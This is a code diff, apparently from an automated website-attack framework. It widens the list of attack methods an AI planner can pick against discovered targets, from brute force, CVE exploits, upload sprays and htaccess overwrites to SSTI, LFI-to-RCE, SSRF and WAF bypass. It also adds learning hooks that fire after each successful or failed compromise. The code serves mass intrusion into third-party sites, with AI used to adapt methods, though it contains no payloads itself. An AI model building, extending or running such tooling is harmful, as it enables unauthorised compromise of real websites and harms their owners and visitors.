@@ -36,6 +36,7 @@ import {
 import { runLearningCycle, runEnhancedLearningCycle, queryHistoricalPatterns, calculateMethodSuccessRates, getCmsAttackProfile } from "./adaptive-learning";
 import type { HistoricalPattern, MethodSuccessRate } from "./adaptive-learning";
 import { isBlacklisted, isOwnRedirectUrl, recordFailedAttack, recordSuccessfulAttack, filterTargets } from "./attack-blacklist";
+import { notifyAttackCompleted } from "./learning-scheduler";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -267,11 +268,26 @@ async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
   }
 
   // ═══ Available methods (minus blacklisted) ═══
+  // ═══ SYNCED with unified-attack-pipeline METHOD_REGISTRY + comprehensive vectors ═══
   const allMethods = [
-    "cve_exploit", "wp_brute_force", "cms_plugin_exploit", "file_upload_spray",
-    "config_exploit", "xmlrpc_attack", "rest_api_exploit", "ftp_brute",
-    "webdav_upload", "htaccess_overwrite", "wp_admin_takeover",
-    "shellless_redirect", "ai_generated_exploit",
+    // Core upload methods (unified pipeline)
+    "oneclick", "try_all", "parallel", "smart_retry",
+    // WordPress-specific
+    "wp_admin", "wp_db", "wp_brute_force", "cve_exploit", "cms_plugin_exploit",
+    // Alternative upload vectors
+    "alt_upload", "file_upload_spray", "xmlrpc_attack", "rest_api_exploit",
+    "ftp_brute", "webdav_upload", "htaccess_overwrite",
+    // Advanced evasion
+    "waf_bypass", "config_exploit",
+    // Non-upload attacks
+    "indirect", "dns", "shellless_redirect",
+    // Comprehensive attack vectors (AI-evolved)
+    "ssti_injection", "nosql_injection", "lfi_rce", "ssrf",
+    "deserialization", "open_redirect_chain", "cache_poisoning",
+    "host_header_injection", "jwt_abuse", "race_condition",
+    "mass_assignment", "prototype_pollution",
+    // AI-generated
+    "ai_generated_exploit", "comprehensive",
   ];
   const availableMethods = allMethods.filter(m => !blacklistedMethods.includes(m));
 
@@ -911,6 +927,7 @@ async function attackSingleTarget(
             sessionId: deployId,
             agenticSessionId: sessionId,
           }).catch((e) => console.error(`[AdaptiveLearning] record success error: ${e.message}`));
+          notifyAttackCompleted(); // Trigger incremental learning
 
           return { target, success: true, reason: "verified", deployId, deployedUrls: verifiedUrls };
         }
@@ -980,6 +997,7 @@ async function attackSingleTarget(
         sessionId: null,
         agenticSessionId: sessionId,
       }).catch((e) => console.error(`[AdaptiveLearning] record failure error: ${e.message}`));
+      notifyAttackCompleted(); // Trigger incremental learning
 
       if (attempt >= maxRetries) {
         // ═══ BLACKLIST: Record failed attack ═══
@@ -1055,6 +1073,7 @@ async function attackSingleTarget(
         sessionId: null,
         agenticSessionId: sessionId,
       }).catch((err) => console.error(`[AdaptiveLearning] record error error: ${err.message}`));
+      notifyAttackCompleted(); // Trigger incremental learning
 
       if (attempt >= maxRetries) {
         // ═══ BLACKLIST: Record error ═══
